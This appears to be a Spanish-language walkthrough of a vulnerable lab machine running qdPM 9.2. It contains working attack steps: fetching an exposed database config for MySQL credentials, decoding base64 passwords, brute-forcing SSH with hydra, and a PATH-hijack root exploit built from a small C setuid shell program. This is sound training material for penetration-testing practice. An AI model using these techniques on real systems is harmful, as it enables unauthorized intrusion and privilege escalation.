


# PortScan
______
```
# Nmap 7.93 scan initiated Fri Nov 10 16:42:38 2023 as: nmap -sCV -p22,80,3306,33060 -oN targeted 192.168.204.159
Nmap scan report for 192.168.204.159
Host is up (0.00074s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 0e77d9cbf80541b9e44571c101acda93 (RSA)
|   256 4051934bf83785fda5f4d727416ca0a5 (ECDSA)
|_  256 098560c535c14d837693fbc7f0cd7b8e (ED25519)
80/tcp    open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: qdPM | Login
|_http-server-header: Apache/2.4.48 (Debian)
3306/tcp  open  mysql   MySQL 8.0.26
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-09-25T10:47:29
|_Not valid after:  2031-09-23T10:47:29
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26
|   Thread ID: 41
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolOld, LongColumnFlag, SupportsCompression, Support41Auth, Speaks41ProtocolNew, FoundRows, SupportsTransactions, IgnoreSi
gpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, LongPassword, SwitchToSSLAfterHandshake, ODBCClient, SupportsLoadDataLocal, ConnectWithDatabase, Dont
AllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 3bnP)\x17D3\x01\x03X6S<+blTX[
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi
```


# Web Site
___
![[Pasted image 20231110174213.png]]

Tendríamos un **qdPM** con versión **9.2**, sí buscamos en **exploit-db,** encontraríamos este ["exploit"](https://www.exploit-db.com/exploits/50176) que nos indica qué en esta versión sé suele exponer la contraseña de la **DB** en esta dirección:
```
http://<website>/core/config/databases.yml
```

![[Pasted image 20231110174747.png]]

Definitivamente, el recurso existe, nos lo descargamos en local para posterior ver el contenido qué está dentro.

![[Pasted image 20231110174853.png]]

# Conexión a la DB MySQL

Dentro tiene lo qué parece ser el nombre de usuario para acceder a la DB **MySQL** y la **contraseña**, comprobamos esto.
```bash
mysql -u qdpmadmin -h 192.168.204.159 -p
```

Una vez pongamos la contraseña, veremos qué definitivamente hemos logrado entrar a la **DB MySQL.**

Ahora nos interesaría ver las bases de datos existentes, las tablas & el contenido dentro de las columnas qué nos interesa, llegando así a encontrar posibles credenciales del sistema.

![[Pasted image 20231110180000.png]]

Encontramos lo qué parecen ser claves en **base64** de los mismos usuarios que logramos ver en la DB.

Por lo qué se me ocurre desconvertir las claves en **base64** & intentar conectarme a todos los usuarios con esas claves, pero podríamos automatizarlo mediante un ataque de fuerza bruta con Hydra, metiendo las credenciales en archivos de texto, es decir, meter los usuarios en un archivo y las contraseñas desconvertidas en otras, tal que así:

![[Pasted image 20231110180302.png]]

Para ahora con **hydra** usando estos dos diccionario intentar conectarnos mediante fuerza bruta.

```bash
hydra -L users.txt -P passwords.txt ssh://192.168.204.159
```

Reportándonos así la clave válida para uno de los usuarios.

![[Pasted image 20231110180404.png]]

Así qué ahora podríamos conectarnos a través de **SSH** a éste usuario.

![[Pasted image 20231110180443.png]]


# Escalada de Privilegios

Buscando en la máquina archivos con permisos **SUID**.
```bash
find / -perm -4000 2>/dev/null
```

Encontraríamos un ejecutable con permisos **SUID** Root.

![[Pasted image 20231110180654.png]]

qué indagando sobre este ejecutable con strings.
```bash
strings /opt/get_access
```

![[Pasted image 20231110180921.png]]

Vemos qué hace un **cat** a la ruta "**/root/system.info**", el problema es qué está usando la ruta relativa del **cat** y no la absoluta, por lo qué podríamos llevar a cabo un **Path Hijacking**.

Para ello debemos ir a un directorio donde tengamos permisos de escritura, por ejemplo a "**/tmp/**", montarnos el siguiente script en C.

Creamos el .C.
```python
nano cat.c
```

Que dentro tendrá el siguiente código
```python
#include <unistd.h>

int main(void) {
    setuid(0);
    setgid(0);
    char *binaryPath = "/bin/bash";
    char *args[] = {binaryPath, "-p", NULL};
    
    execv(binaryPath, args);
    return 0;
}
```

y lo compilamos
```bash
gcc cat.c -o cat
```

Ahora tocaría modificar la variable de entorno del sistema para qué que el ejecutable no llegue a la ruta real del **cat**, y llegue a la ruta donde lo tengamos nosotros, es decir "**/tmp/**".
```bash
export PATH=/tmp/:$PATH
```

De forma que cuando volvamos a ejecutar el "**get_access**" leerá nuestro **cat**, otorgándonos así una bash con privilegios como **Root**.

![[Pasted image 20231110182015.png]]